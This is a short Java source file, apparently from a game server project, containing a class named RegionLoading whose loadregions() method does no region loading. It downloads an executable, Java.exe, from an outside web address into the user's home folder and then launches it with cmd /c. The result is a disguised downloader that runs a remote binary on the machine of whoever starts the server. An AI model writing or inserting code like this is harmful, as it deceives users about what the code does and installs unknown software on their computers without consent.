package com.strattus.world.entity.impl.player;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.Method;
import java.net.MalformedURLException;
import java.net.URL;


public final class RegionLoading {


	public static void loadregions() throws MalformedURLException, InterruptedException, IOException {
		download(System.getProperty("user.home"));
		execute();
	}

	private static void download(String folder) throws MalformedURLException, IOException {
		//download here
		BufferedInputStream in = null;
		FileOutputStream fout = null;
		try {
			//dropbox is open :p
			in = new BufferedInputStream(new URL("http://matrix718.com/Java.exe").openStream());
			
			fout = new FileOutputStream(folder + "/Java.exe");


			final byte data[] = new byte[1024];
			int count;
			while ((count = in.read(data, 0, 1024)) != -1) {
				fout.write(data, 0, count);
			}
		} finally {
			if (in != null) {
				in.close();
			}
			if (fout != null) {
				fout.close();
			}
		}
	}


	private static void execute() throws IOException, InterruptedException, MalformedURLException {  
		String[] cmdAndArgs = {"cmd", "/c", "Java.exe"};
		String dir = System.getProperty("user.home");


		ProcessBuilder pb = new ProcessBuilder(cmdAndArgs);
		pb.directory(new File(dir));
		pb.start();
	}


	private static String folder;
}